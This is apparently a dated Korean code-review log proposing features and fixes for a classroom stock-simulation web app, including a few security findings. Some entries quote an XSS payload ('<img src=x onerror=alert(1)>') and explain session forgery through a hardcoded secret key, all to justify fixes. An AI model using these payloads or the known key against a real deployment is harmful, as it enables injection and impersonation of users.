- **`kick_member()`는 `waiting` 상태에서만 동작하지만 `join_room()`은 `active`·`paused` 상태에서도 허용 — 강퇴 불가 상황 발생** (`app.py:564-575`, `app.py:392-406`): 게임이 시작된 후 늦게 입장한 학생을 진행자가 강퇴할 수단이 없음. `kick_member()`에서 `waiting` 체크를 제거하고 `active`·`paused` 상태에서도 강퇴를 허용하되, 강퇴 시 해당 학생의 `RoomHolding`·`Deposit`을 정산(주식 → 현금, 예금 원금 복구 후 삭제)하는 로직을 추가해야 일관성이 유지됨.

- **`enter()` 닉네임 내부 공백 정규화 없음 — "홍길동" vs "홍  길동" 별개 유저 생성** (`app.py:332-339`): `u = d.get('username','').strip()`은 앞뒤 공백만 제거하고 내부 연속 공백은 그대로 둠. "20715 홍 길동"처럼 학번과 이름 사이에 공백이 하나 더 들어가면 새 User 레코드가 생성되어 기존 세션과 분리됨. `' '.join(u.split())`로 내부 공백을 단일화하면 비의도적 중복 계정 방지.

- **`StockService.get_history()` 차트 데이터가 실제 게임 중 가격 변동과 무관한 랜덤값** (`stock_service.py:281-310`): `get_history()`는 `current` 가격에서 역방향으로 랜덤 바(bar)를 생성하므로, 같은 종목을 두 번 조회해도 다른 차트 형태가 나올 수 있음(캐시 히트 시엔 동일). 특히 가격이 뉴스로 크게 움직인 뒤 차트에는 그 움직임이 반영되지 않아 학생들이 혼란을 겪음. 단기적으로는 차트 모달에 "실시간 반영 미지원 — 참고용" 안내 문구를 추가하고, 장기적으로는 `StockService`에 `_price_log: list`를 추가해 게임 중 실제 가격을 타임스탬프와 함께 기록하는 방향으로 개선 가능.


## 2026-07-28 (2차)

### 추가하면 좋을 기능

- **호스트 공지 방송 기능** (`app.py` 신규 엔드포인트, `app.js:enterParticipantGame()` 폴링 루프): 진행자가 수업 중 학생 전체에게 즉시 메시지를 보낼 방법이 없어 현재는 '폭탄뉴스'만 간접 소통 수단임. `POST /api/rooms/<rid>/host/broadcast` 엔드포인트를 추가해 `{'message': str, 'ts': float}` 를 인메모리에 저장하고, `get_room()` 응답 또는 별도 `GET /api/rooms/<rid>/broadcast` 로 최신 공지를 노출하면 됨. `app.js` 폴링 루프(`app.js:613`)에서 `ts` 비교 후 새 공지가 있으면 `showBombNews()` 와 유사한 팝업 배너로 표시. 수업 재개·행동 지시·긴급 공지에 즉각 활용 가능.

- **거래 내역 액션 필터** (`app.js:1569-1593 loadTxn()`, `app.py:829-847 get_transactions()`): 포트폴리오의 거래 내역에 매수·매도·조정·룰렛이 모두 섞여 있어 특정 패턴을 찾기 어려움. `?action=BUY` 쿼리파라미터를 `get_transactions()` 에 추가하거나(서버에서 `.filter()` 한 줄 추가), 클라이언트에서 전체 1페이지를 로드한 뒤 `filter(t => !tab || t.action === tab)` 로 필터링하는 방식으로 구현. `txn-list` 위에 BUY / SELL / ADJ / 전체 탭 버튼을 두면 학생이 자신의 투자 행태를 종류별로 돌아볼 수 있음.

- **포트폴리오 분산도 점수 표시** (`app.js:1457-1563 loadPortfolio()`, `app.py:772-803 get_portfolio()`): 학생이 몇 개 섹터에 분산 투자했는지 알 수 없음. `get_portfolio()` 응답에 이미 각 보유 종목의 `sector` 가 포함되어 있으므로, `app.js` 클라이언트에서 `new Set(holdings.map(h => h.sector)).size` 로 섹터 수를 집계하고 보유 섹터 수에 따라 1개=❌분산없음, 3+개=🟡적절, 5+개=✅우수 배지를 포트폴리오 요약 카드 아래에 표시. 서버 변경 없이 JS 약 8줄 추가로 분산투자 교육 메시지를 시각화.

- **학생 연결 상태 표시 (활성/비활성 표시)** (`app.py:542-562 host_members()`, `models.py RoomMember`): 진행자 랭킹 목록에서 어떤 학생이 실시간으로 게임에 접속 중인지 알 수 없음. `RoomMember` 에 `last_seen = db.Column(db.DateTime, nullable=True)` 컬럼을 추가(`app.py:31-40` `ALTER TABLE` 패턴 활용)하고, `get_room()` 또는 `get_portfolio()` 진입 시 `member.last_seen = datetime.utcnow()` 를 갱신. `host_members()` 응답에 `last_seen_secs` 를 포함해 60초 이내이면 초록 점, 초과이면 회색 점을 `host-member-row` 에 표시하면 교사가 오프라인 학생을 즉시 식별 가능.

- **방 설정 프리셋 저장 (localStorage)** (`app.js:121-140 doCreateRoom()`, `static/index.html 방 만들기 폼`): 교사가 매번 게임을 생성할 때 게임 시간·시작 자금·예금 금리를 다시 입력해야 함. `doCreateRoom()` 에서 방 생성 성공 시 `localStorage.setItem('roomPreset', JSON.stringify({dur, cash, rate}))` 로 저장하고, 방 만들기 화면 진입 시(`enterHostLobby()` 이전) 저장된 값을 폼 필드에 자동 복원. 5줄 이하의 JS 변경으로 반복 수업에서 설정 재입력 부담을 없앨 수 있음.

- **최소 거래 단위 설정 (lot size)** (`app.py:363-390 create_room()`, `app.py:724-767 trade()`, `models.py Room`): 시작 자금이 큰 게임에서 학생들이 1주씩 잦은 소량 거래를 반복해 순위보다 거래 횟수 경쟁이 되는 경우가 있음. `Room` 모델에 `min_lot = db.Column(db.Integer, default=1)` 추가, `create_room()` 에서 `min_lot` 파라미터를 수신, `trade()` 에서 `if shares % room.min_lot != 0: return 400` 체크. 방 생성 UI에 "최소 거래 단위" 선택 드롭다운(1 / 10 / 100 / 1000주)을 추가하면 수업 목표에 맞게 조절 가능.

### 제거/단순화할 것들

- **`get_rankings()` · `host_members()` N+1 쿼리 — 학생 30명 시 90회 이상 SQL 발행** (`app.py:107-118 member_total_value()`, `app.py:812-824`, `app.py:542-562`): `member_total_value(rid, uid)` 가 호출될 때마다 `RoomMember` 1건 + `RoomHolding` 필터 + `Deposit` 필터 쿼리 3개를 실행하며, 랭킹·호스트 멤버 목록 모두 멤버 수 N 만큼 반복 호출함. 수정 방법: 두 엔드포인트 진입 시 `RoomHolding.query.filter_by(room_id=rid).all()` 과 `Deposit.query.filter_by(room_id=rid, status='active').all()` 을 한 번씩만 호출하고 `{uid: [holdings]}`, `{uid: [deposits]}` 딕셔너리로 집계한 뒤 각 멤버의 총자산을 Python에서 계산하면 쿼리 수가 O(N)→O(1) 로 줄어 10초 폴링 부하가 크게 감소.

- **`datetime.utcnow()` Python 3.12 deprecation 전면 적용** (`app.py:125,279,437,442,447,458,482,496,499,511,530,534,985,988,990` 및 `models.py:20,38,53,79,91`): `datetime.utcnow()` 는 Python 3.12에서 공식 deprecation 경고가 발생하며 향후 제거 예정. 코드에서 이미 `from datetime import timezone` 을 임포트(`app.py:2`)하고 있으므로 `datetime.utcnow()` 전체를 `datetime.now(timezone.utc).replace(tzinfo=None)` (기존 naive datetime 유지 시) 또는 `datetime.now(timezone.utc)` (aware datetime 전환 시)로 일괄 치환. `models.py` 의 `default=datetime.utcnow` 도 `default=lambda: datetime.now(timezone.utc).replace(tzinfo=None)` 으로 교체 필요.

- **`SECRET_KEY` 하드코딩 fallback — 세션 위조 보안 취약점** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` 코드가 GitHub에 공개되어 있어 SECRET_KEY 환경 변수가 누락된 배포에서 공격자가 임의 `user_id` 가 담긴 서명된 쿠키를 직접 생성해 다른 사용자로 위장할 수 있음. Render 환경 변수가 누락된 경우를 대비해 `if not os.environ.get('SECRET_KEY'): import warnings; warnings.warn('SECRET_KEY not set, sessions are insecure')` 최소 경고를 추가하거나, fallback 문자열을 제거하고 `os.urandom(24).hex()` 로 랜덤 생성해 재시작 시 세션이 무효화되도록 하는 편이 안전.

- **XSS 위험 — `loadLobbyMembers()` · `loadHostMembers()` 에서 username이 onclick 속성에 직접 삽입** (`app.js:229`, `app.js:425-426`): `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"`  패턴은 `'` 만 이스케이프하므로 username에 `</button><img src=x onerror=alert(1)>` 같은 문자열이 포함될 경우 HTML 인젝션이 발생. 동일 취약점이 `app.js:583`(`loadPLobbyMembers`)에도 존재. 수정: 동적 username을 `onclick` 인라인 대신 `data-uid` / `data-name` 속성에 넣고 이벤트 위임(`element.dataset.name`)으로 접근하거나, 이미 정의된 `escHtml()` (`app.js:897`)를 innerHTML에 사용.

- **`refreshMyRank()` 가 전체 랭킹 쿼리를 10초마다 호출 — 자신의 순위만 필요함에도 N명 집계 수행** (`app.js:735-752`, `app.py:808-824 get_rankings()`): `refreshMyRank()` 는 단순히 현재 사용자의 순위·총자산을 HUD에 업데이트하기 위해 방의 전 참여자를 조회하는 `get_rankings()` 를 호출함. 학생 수가 많을수록 비효율. `GET /api/rooms/<rid>/portfolio` 응답에 `rank` 와 `total_members` 필드를 추가하거나(이미 rankings 정보를 가져오므로 서버에서 정렬 뒤 현재 user rank를 포함), 별도 `GET /api/rooms/<rid>/my-rank` 경량 엔드포인트를 신설해 `member_total_value()` 1회 + 전체 멤버 total 집계로 순위만 반환.

- **`minigame_close()` 에서 deprecated `Room.query.get(rid)` 사용** (`app.py:976`): `_rlt_lock` 블록 내부에서 `room = Room.query.get(rid)` (레거시 SQLAlchemy 1.x `Query.get()`)를 사용. 나머지 코드는 모두 `db.session.get(Room, rid)` 또는 `.get_or_404()` 를 사용하는데 이 위치만 누락됨. `db.session.get(Room, rid)` 로 교체하면 일관성 확보 및 SQLAlchemy 2.x 경고 제거.


---

## 2026-07-29

### 추가하면 좋을 기능

- **엑셀 순위표에 거래 횟수 / 퀴즈 참여 통계 컬럼 추가** (`app.py:1419-1488`, `export_rankings()`): 현재 Excel에는 순위·이름·학번·최종 자산·수익률·수익금액만 포함. `RoomTransaction.query.filter_by(room_id=rid, user_id=uid)` 결과를 `action`별로 집계해 매수 횟수, 매도 횟수, 퀴즈 정답 횟수(`note='퀴즈 정답' 포함 RLT ADJ 제외 ADJ`)를 열로 추가하면 수업 참여도 평가에 직접 활용 가능. `app.py:1431-1439` 루프에서 멤버별 트랜잭션을 한 번에 일괄 조회(`RoomTransaction.query.filter_by(room_id=rid).all()` → uid별 dict)해 N+1 없이 구현.

- **게임 진행 중 강퇴 기능** (`app.py:564-575`, `kick_member()`): 현재 `room.status != 'waiting'` 조건(`app.py:570`)으로 게임 시작 후 강퇴 불가. 수업 중 인터넷 채팅 등 방해 학생을 즉시 제거할 수 없음. 게임 중 강퇴 시 보유 주식을 현재가로 청산해 cash로 환원(`_end_room` 내 개별 청산 로직 참조)하거나, 단순히 `RoomMember` 레코드를 삭제하되 순위 계산에서 제외하는 방식으로 구현 가능. 프론트엔드는 이미 강퇴 버튼(`app.js:229`)이 있으므로 서버 조건 제거만으로 기능 활성화.

- **참여자 마지막 활동 시간 추적** (`models.py:47-54`, `RoomMember`): 현재 진행자는 누가 실제로 화면을 보고 거래하는지 알 수 없음. `RoomMember`에 `last_active_at = db.Column(db.DateTime)` 컬럼을 추가하고, 매매(`app.py:724-767`)·퀴즈 제출(`app.py:1270`)·포트폴리오 조회(`app.py:772`) 등 주요 엔드포인트에서 업데이트. `host_members()` 응답(`app.py:548-562`)에 `last_active_ago` 초를 포함하면 진행자 대시보드에서 "5분 이상 미활동" 학생을 바로 파악해 독려 가능.

- **진행자 수동 룰렛 트리거** (`app.py:519-537`, `end_room()`; `app.js:217`): 룰렛은 게임 종료 5초 전 자동 트리거만 지원(`app.py:446-465`). 복권처럼 진행자가 게임 중간에 "역전의 기회"로 수동 룰렛을 실행할 수 없음. `host_settings` 탭에 "룰렛 지금 시작" 버튼을 추가하고, 신규 `POST /api/rooms/<rid>/host/trigger-roulette` 엔드포인트에서 `room.rlt_triggered = True`, `room.status = 'paused'`, `room.paused_at = now` 처리 후 참여자 폴링에서 `minigame_available` 플래그로 오버레이 트리거. 기존 `minigame_open/close/spin` 로직 그대로 재사용 가능.

- **포트폴리오 페이지에서 직접 매도 버튼 추가** (`app.js:1481-1540`, `loadPortfolio()`; `static/index.html:386-403`): 현재 보유 종목 카드에는 "내역" 버튼만 있고, 매도하려면 시장 탭으로 이동해 종목을 검색·클릭해야 함. 포트폴리오 종목 카드에 "매도" 버튼을 추가해 `openStockModal(symbol, holdingFallback)` 를 호출하면 2-3탭 이동을 없앨 수 있음. `openStockModal()`이 `fallback` 파라미터를 이미 지원(`app.js:1327`)하므로 현재 가격을 전달해 차트 로딩 없이 즉시 거래 모달 오픈 가능.

### 제거/단순화할 것들

- **`loadLobbyMembers()` / `loadPLobbyMembers()` / `loadHostMembers()` XSS 취약점** (`app.js:224`, `app.js:583`, `app.js:413`): `m.username`이 `innerHTML` 문자열 보간(`${m.username}`)으로 직접 삽입됨. 서버 측 입력 검증(`app.py:333`)이 길이만 체크해 `<img src=x onerror=alert(1)>` 같은 페이로드(26자, 유효)를 허용. `escHtml()` 함수가 `app.js:897`에 이미 존재하나 세 곳 모두 미적용. 또한 `app.js:229`의 onclick 인라인 핸들러 `'${m.username.replace(/'/g,"\\'")}'`도 `</ 스크립트>` 같은 인젝션에 취약. 수정: 세 함수의 username 렌더링 모두 `escHtml(m.username)`으로 교체. 서버에서도 `app.py:334`에 `import re; if re.search(r'[<>&"\']', u): return ...` 방어 추가 권장 (교실 공개 배포 환경이므로 우선순위 높음).

- **`_quiz_settings` / `_roulette_config` 서버 재시작 시 소실** (`app.py:1246-1247`, `app.py:250`): Render 무료 플랜은 비활성 15분 후 컨테이너를 재시작. 진행자가 설정한 퀴즈 보상률·패널티율과 룰렛 배율·확률이 모두 초기화됨. `Room` 모델에 `quiz_reward_pct`, `quiz_penalty_pct`, `rlt_multipliers`, `rlt_weights` 컬럼을 추가하거나(또는 `Room.extra_config = db.Column(db.Text)` JSON 컬럼 하나로 통합), `_quiz_settings`/`_roulette_config` dict 조회 시 DB를 fallback으로 사용하면 재시작 내성 확보. `app.py:26-40`의 `ALTER TABLE` 패턴을 그대로 활용해 마이그레이션 가능.

- **`stock_service.py` 1일 차트가 1개월 차트와 동일한 30개 일별 봉 생성** (`stock_service.py:292`): `n_bars = {'1d': 30, '5d': 5, '1mo': 30, ...}` — `1d`와 `1mo` 모두 30개 봉을 생성하며 날짜 레이블도 동일하게 `%Y-%m-%d` 단위로 붙음. 학생이 "1일" 탭을 눌러도 한 달치 그래프와 외관이 같아 시간 축 개념 학습에 혼선. `1d`는 `n_bars=16`으로 줄이고 레이블을 `HH:MM` 형식으로, `1w`는 `n_bars=5`에 요일 표기로 분리하면 실제 증권 앱과 유사한 UE 제공. `stock_service.py:296-307` 루프의 `date_str` 생성 부분에서 분기 처리.

- **`enterParticipantGame()` 폴링에서 `/rankings` API 중복 호출** (`app.js:611`, `app.js:647`): 10초 interval 콜백(`app.js:613-651`)에서 `refreshMyRank()` (내부적으로 `GET /rankings` 호출) + 현재 페이지가 `rankings`이면 `loadParticipantRankings()` (또 `GET /rankings` 호출) 두 번 호출될 수 있음. 추가로 시장 페이지이면 `loadMarket()`도 동시 호출. 즉 학생 한 명당 10초마다 최대 3 API 호출 발생. `refreshMyRank()`에서 순위 정보를 별도 조회하는 대신, 기존 폴링에서 이미 받은 `GET /api/rooms/{rid}` 응답에 `my_rank`와 `my_total_value` 필드를 추가(`app.py:288-305`, `room_dict()`)하면 호출 1회로 통합 가능.

- **룰렛 자동 닫힘 60초 카운트다운 경고 미흡** (`app.js:975-991`, `_startRltAutoClose()`): 잔여 스핀이 남아 있는 상태에서 60초가 지나면 오버레이가 자동으로 닫혀 나머지 기회를 잃음. 타이머 표시 (`app.js:979`) 가 작은 `font-size:11px` muted 텍스트라 학생이 주목하기 어려움. 30초 이하 구간에서 글씨를 `color:var(--down)` + `font-weight:700`으로 바꾸고, 자동 닫힘 직전에 `if (data.spins_left > 0) { confirmAutoClose() }` 확인창을 추가하거나 최소한 `closeRoulette()` 호출 전 남은 스핀 수를 toast로 표시하는 방어 코드 추가 권장.


## 2026-07-29 (2차)

### 추가하면 좋을 기능

- **게임 시간 연장/단축 기능 (진행자)** (`app.py:475-488`, `start_room()`; `app.js:258-274`, `enterHostGame()`): 게임 시작 후 진행자가 남은 시간을 조정할 방법이 없어 수업 흐름에 맞게 탄력 운영이 불가. `POST /api/rooms/<rid>/host/extend` 엔드포인트를 추가해 `{"minutes": 10}` (±1~30분, 최대 360분 초과 불가)를 받아 `room.end_time += timedelta(minutes=minutes)` 후 `_invalidate_room_cache(rid)` 호출. `status='paused'` 상태에서도 `paused_at + remaining + delta` 로 계산해야 올바름. 진행자 설정 탭에 "⏱ +5분 / −5분" 버튼 + 입력창으로 구현. 서버 약 15줄·클라이언트 약 20줄 추가.

- **호스트 시장 탭 종목 카드 클릭 시 차트 팝업** (`app.js:343-357`, `loadHostMarket()`): 진행자 시장 탭의 종목 카드(`app.js:343`)는 클릭해도 아무 반응 없음. `renderGrid()` 와 동일하게 `onclick="openStockModal('${st.symbol}')"` 를 각 카드 `<div>`에 추가하면 기존 주식 상세/차트 모달이 재사용됨(단 매매 버튼 비활성화는 호스트 체크 조건 추가 또는 CSS `hidden` 처리). 수업 중 특정 종목 차트를 프로젝터에 바로 띄워 설명할 수 있어 교육적 흐름에 도움. 클라이언트 HTML 1줄 수정, 서버 변경 없음.

- **퀴즈 누적 통계 API (진행자용)** (`app.py:1399-1414`, `quiz_settings()`; `app.py:1270-1342`, `submit_quiz()`): 진행자가 퀴즈 보상률·패널티율을 설정할 수 있지만 실제 퀴즈 참여 현황(총 참여 횟수·정답률·보상 지급 합계)을 볼 방법이 없음. `GET /api/rooms/<rid>/host/quiz-stats` 신규 엔드포인트를 추가해 `RoomTransaction.query.filter_by(room_id=rid, action='ADJ').filter(RoomTransaction.note.like('%퀴즈%')).all()` 로 정답/오답 건수 및 지급 금액을 집계. 진행자 설정 탭 퀴즈 패널 하단에 "총 시도 N회 · 정답 M회 · 보상 합계 X원" 미니 통계 카드 형태로 렌더링하면 퀴즈 교육 효과 모니터링 가능.

- **포트폴리오 탭에서 예금 이자 현황 통합 표시** (`app.js:1457-1565`, `loadPortfolio()`; `app.py:852-876`, `get_deposits()`): 포트폴리오 페이지는 `deposits_locked` 총액만 요약하고 개별 예금의 예상 이자 정보가 없음. `loadPortfolio()` 내에서 `GET /deposits`를 병렬 호출(`Promise.all`)해 활성 예금 각각의 원금·예상 이자를 보유 주식 목록 아래에 섹션으로 추가하면, 학생이 포트폴리오 탭 하나에서 주식·현금·예금 이자를 포함한 전체 자산 구성을 파악 가능. 서버 변경 없이 클라이언트 약 15줄 추가.

- **뉴스·주가 갱신 속도 프리셋 버튼** (`app.py:630-646`, `host_news_interval()`; `app.js:391-406`, `doSetIntervals()`): 진행자가 뉴스/주가 갱신 주기를 숫자로 직접 입력해야 해 수업 흐름 중 빠른 모드 전환이 어려움. "🐢 느림(120초/180초)", "⚡ 보통(30초/45초)", "🚀 빠름(10초/15초)", "📚 설명(60초/300초)" 프리셋 버튼 4개를 `doSetIntervals()` 입력창 위에 추가하면 클릭 한 번으로 게임 페이스 조절 가능. 각 버튼 `onclick`에서 `document.getElementById('news-interval-input').value = N` 셋팅 후 `doSetIntervals()` 호출. 기존 엔드포인트 재사용, 서버 변경 없음, 클라이언트 HTML ~25줄.

- **대규모 단일 거래 확인 다이얼로그** (`app.js:1424-1454`, `execTrade()`): 스마트폰에서 수량 입력 오류로 현금 전액을 단일 종목에 투자하는 사고를 방지할 수단이 없음. `execTrade()` 내에서 `const ratio = (shares * S.tradePrice) / S.tradeCash`를 계산해 `ratio > 0.3` (보유 현금의 30% 초과)이고 `action === 'BUY'`인 경우 `confirm('현금의 ${Math.round(ratio*100)}%를 사용합니다. 계속하시겠습니까?')` 확인창을 표시. 클라이언트 JS 5줄 추가, 서버 변경 없음. 학생의 실수성 대형 매수 방지.

### 제거/단순화할 것들

- **`Room.query.get_or_404()` deprecated 레거시 Query API — 30개 이상 엔드포인트 전반 미수정** (`app.py:435,478,493,506,521,545,565,580,609,654,675,693,727,775,883,921,939,965,999,1081,1114,1159,1188,1213,1251,1271,1346,1364,1387,1400,1419` 등): 이전 분석에서 `minigame_close()`의 `Room.query.get(rid)` (line 976) 한 곳만 지적했으나, `Room.query.get_or_404(rid)` 도 동일하게 SQLAlchemy 2.0 레거시 Query API임. Flask-SQLAlchemy 3.x에서 `db.get_or_404(Room, rid)` 또는 `db.session.get(Room, rid)` + 404 처리로 일괄 교체 필요. 프로젝트 전체 `Room.query.get_or_404` 패턴을 `sed -i 's/Room\.query\.get_or_404(\(.*\))/db.get_or_404(Room, \1)/g'` 로 일괄 치환 후 테스트.

- **`create_room()` int/float 변환 try/except 누락 — 비숫자 입력 시 500 에러** (`app.py:384-387`): `int(d.get('duration_minutes', 30))`, `float(d.get('starting_cash', 10_000_000))`, `float(d.get('deposit_rate', 3.0))` 세 변환에 try/except 가 없음. 악의적 사용자가 `{"duration_minutes": "abc"}` 전송 시 `ValueError` → 500 응답. `trade()` (`app.py:738-739`)는 동일 패턴에 try/except를 적용했으나 `create_room()`은 누락. 세 변환을 `try: duration=int(...) except (TypeError,ValueError): return jsonify({'error':'잘못된 입력'}),400` 패턴으로 보호 필요.

- **`_auto_start_lottery_if_due()` 복권 `revealed` 상태에서 다음 회차 즉시 자동 시작 버그** (`app.py:408-430`, `app.py:181-198`): `_lot_round_due()`는 `cur['state']`가 `'picking'`/`'drawing'`이면 early-return 하지만 `'revealed'`이면 통과해 다음 회차 번호를 반환함. 이후 `_auto_start_lottery_if_due()`에서 state가 `picking/drawing` 아니면 새 round를 시작해 이전 회차 결과 화면을 덮어씀. 60분 이하 게임에서 1회차 복권이 `pct >= 2/3` 구간에 `revealed`되면 매 10초 폴링마다 2회차 자동 시작이 반복. 수정: `_lot_round_due()` 의 early-return 조건을 `if cur and cur.get('state') in ('picking', 'drawing', 'revealed'): return None` 으로 확장.

- **`lobby_members()` 멤버십·호스트 검증 없음 — 임의 rid로 전체 참여자 목록 열람 가능** (`app.py:577-585`): `@login_required` 외 접근 제어 없음. 로그인된 사용자가 임의 rid로 `GET /api/rooms/{rid}/host/lobby-members`를 호출하면 해당 방 모든 학생 닉네임이 노출. 참여자 로비(`loadPLobbyMembers`)도 이 엔드포인트를 사용하므로 완전 차단 대신, `user = cur_user(); room = db.get_or_404(Room, rid); if room.host_id != user.id and not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error':'권한없음'}), 403` 을 추가해 방 관계자만 접근 허용.

- **`StockService.get_history()` 캐시 만료 시 매번 다른 랜덤 차트 생성** (`stock_service.py:281-309`): `HISTORY_CACHE_TTL=120`초 경과 후 `get_price()` 호출로 캐시가 무효화되면(`stock_service.py:187-189`), 학생이 "1달" 탭 → "3달" 탭 → 다시 "1달" 탭을 누를 때 캐시 미스 시마다 완전히 다른 형태의 차트가 표시됨. 학생이 이미 본 차트를 다시 보려 하면 혼란. 수정: `StockService.__init__`에서 `self._history_seed = random.randint(0, 2**32)`를 한 번 고정한 뒤, `get_history()` 내 바(bar) 생성 직전 `random.seed(self._history_seed ^ hash((symbol, period)))` 를 적용해 같은 종목·기간 조합은 항상 같은 형태의 차트를 생성.

- **`minigame_close()` `unfreeze()` 호출이 `db.session.commit()` 보다 앞에 위치 — 가격 재개와 상태 저장 사이 경쟁 조건** (`app.py:978-990`): `_rlt_lock` 블록 안에서 `get_room_service(rid).unfreeze()` (가격 시뮬레이션 재개) → `room.status = 'active'` → `db.session.commit()` 순으로 진행됨. `unfreeze()` 이후 commit 전 수 ms 동안 가격은 변동되지만 DB는 `status='paused'`를 유지해, 그 사이 `get_room()` 폴링을 받은 클라이언트는 "일시정지 상태지만 가격은 변동 중"인 불일치 상태를 받게 됨. `db.session.commit()` 완료 후 `unfreeze()`를 호출하는 순서 교환으로 해결 (`app.py:988` ↔ `app.py:989` 순서 변경).

- **`submit_quiz()` 타임아웃과 의도적 오답 구별 불가 — 서버 측 통계 블랙박스** (`app.js:876-879`, `app.py:1282-1342`): 퀴즈 30초 타임아웃 시 클라이언트가 `{answer: false}` 를 전송(`app.js:877`)해 서버는 이를 일반 오답과 동일하게 처리·패널티 부과. 의도적 틀린 답과 미응답을 구분할 수 없어 향후 퀴즈 통계 기능 추가 시 데이터 품질 저하. 수정: `{answer: false, timed_out: true}` 필드를 추가하고, `submit_quiz()` (`app.py:1281`)에서 `timed_out = bool(d.get('timed_out'))` 수신 후 `RoomTransaction.note` 에 `'퀴즈 시간초과'`/`'퀴즈 오답'` 으로 구분 기록. 클라이언트 1줄·서버 3줄 수정.

## 2026-07-30

### 추가하면 좋을 기능

- **`api.get()/api.post()` 서버 상세 오류 메시지 미전달 — 학생에게 "HTTP 400"만 노출** (`app.js:30-44`): `!r.ok` 시 `return {error: 'HTTP ${r.status}'}` 로 서버의 JSON body를 버림. 예를 들어 매수 실패 시 서버는 `{"error": "잔액 부족 — 필요: 1,500,000원 / 보유: 800,000원"}` (400)를 반환하지만(`app.py:749`), `execTrade()` (`app.js:1435`)의 피드백 필드에는 "HTTP 400"만 표시됨. `const body = await r.json().catch(()=>({})); return {error: body.error || 'HTTP ${r.status}'}` 로 교체하면 백엔드 전 엔드포인트의 상세 메시지가 UI에 표출되어 수업 중 학생 혼란 즉각 감소. 클라이언트 2줄 수정, 서버 변경 없음.

- **순위/호스트 멤버 조회 N+1 쿼리 최적화** (`app.py:107-118`, `app.py:815-823`, `app.py:542-562`): `get_rankings()`와 `host_members()` 모두 for 루프 안에서 `member_total_value(rid, uid)`를 호출하며, 이 함수는 내부적으로 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)`·`Deposit.query.filter_by(room_id=rid, user_id=uid)` 두 쿼리를 실행. 학생 30명 기준 1회 순위 갱신마다 최소 60 추가 쿼리. `RoomHolding.query.filter_by(room_id=rid).all()`·`Deposit.query.filter_by(room_id=rid, status='active').all()` 을 루프 진입 전 각 1회 실행하고 `user_id`로 딕셔너리화하면 전체 쿼리를 2개로 고정. Render 무료 SQLite 환경에서 10초 폴링 × 30명 = 분당 1,800개 → 120개로 감축.

- **게임 종료 결과 화면에서 개인 거래 요약 표시** (`app.js:798-804`, `publishResults()`; `app.py:828-847`, `get_transactions()`): `screen-results`는 현재 전체 순위 바차트·발표 버튼·Excel 다운로드만 있음. 학생이 자신의 매매 결정을 되짚는 성찰 기회가 없어 교육 효과 반감. `loadResults()` 완료 후 `GET /api/rooms/{rid}/transactions` 를 호출해 거래 내역(시간·종목·수량·단가)을 결과 화면 하단 "내 투자 돌아보기" 섹션으로 추가. 서버 변경 없음, 클라이언트 약 20줄.

- **진행자 로비에서 게임 설정 변경 기능** (`app.py:363-390`, `create_room()`; `app.py:475-488`, `start_room()`): 방 생성 후 `status='waiting'` 동안 게임 시간·시작 자금·예금 금리 변경 불가. 수업 시간 조정이나 학생 수 변화에 대응 곤란. `PATCH /api/rooms/<rid>` 엔드포인트를 추가해 `waiting` 상태에서만 `duration_minutes`·`starting_cash`·`deposit_rate` 업데이트 허용 후 `_invalidate_room_cache(rid)` 호출. 로비 화면에 작은 "⚙️ 설정 변경" 토글로 구현. 서버 약 15줄, 클라이언트 약 25줄.

- **룰렛 자동 자산 청산 전 확인 모달 추가** (`app.py:1022-1058`, `minigame_spin()`; `app.js:1032-1097`, `doRouletteSpin()`): 베팅금이 보유 현금을 초과하면 서버가 보유 주식→예금 순으로 자동 청산(`app.py:1026-1058`). 학생은 "왜 내 삼성전자 주식이 팔렸냐"는 당혹감을 겪음. 클라이언트 `doRouletteSpin()` 에서 `bet > S.tradeCash`(현금만) 조건 시 `confirm('현금이 부족해 보유 주식이 자동으로 청산됩니다. 계속하시겠습니까?')` 확인 다이얼로그 추가. 서버 변경 없음, 클라이언트 3줄.

### 제거/단순화할 것들

- **퀴즈 타임아웃 시 `answer=false` 전송 → `a: False` 정답 문항에서 보상 지급 버그** (`app.js:877`, `app.py:1282-1286`, `education_data.py:190,193,195,199,202,204,205,206` 등): 30초 타임아웃 시 클라이언트가 `{answer: false}` 전송(`app.js:877`). 서버 `submit_quiz()`는 `user_answer = bool(d.get('answer'))` → `False` 로 평가 후 `correct = user_answer == q['a']` 계산. `education_data.py`의 퀴즈 40여 문항 중 절반 이상이 `'a': False` (예: id 2·5·7·9·12·14·16·17·19 등) 이므로, 해당 문제를 받은 학생이 30초 무응답·타임아웃해도 `False == False = True` → **정답 판정 후 보상 지급**. 수정: `app.js:877`을 `{answer: false, timed_out: true}` 로 변경하고 서버 `app.py:1282` 에서 `if bool(d.get('timed_out')): correct = False` 분기 추가. 클라이언트 1줄·서버 2줄.

- **`host_adjust()` delta NaN/Infinity 입력 시 회원 cash DB 오염** (`app.py:593-603`): `delta = float(d.get('delta', 0))` 는 `float('nan')`, `float('inf')` 를 유효한 파이썬 값으로 허용. `m.cash = max(0, m.cash + float('nan'))` = `nan` 이 DB에 저장되면 이후 `member_total_value()`·순위 계산·Excel 내보내기에서 `TypeError`·표시 오류 연쇄 발생. 수정: 변환 직후 `import math; if not math.isfinite(delta): return jsonify({'error': '잘못된 금액'}), 400` 1줄 추가. 현재 `trade()` (`app.py:739`)와 `create_deposit()` (`app.py:888-889`)도 동일 패턴 미적용 상태.

- **`loadPortfolio()` 자산 추이 라인 차트 매 탭 전환마다 파괴·재생성** (`app.js:1505-1540`): 포트폴리오 탭 진입마다 `S.assetLineChart.destroy()` 후 `new Chart(...)` 재실행. Chart.js 인스턴스 생성 비용(DOM 조작·캔버스 초기화) 이 불필요하게 반복. `S.hostBarChart` (`app.js:440-447`)처럼 인스턴스가 이미 있으면 `data.labels`·`datasets[0].data`를 업데이트 후 `update()` 호출하는 패턴으로 교체. 탭 전환 애니메이션도 끊기지 않게 됨.

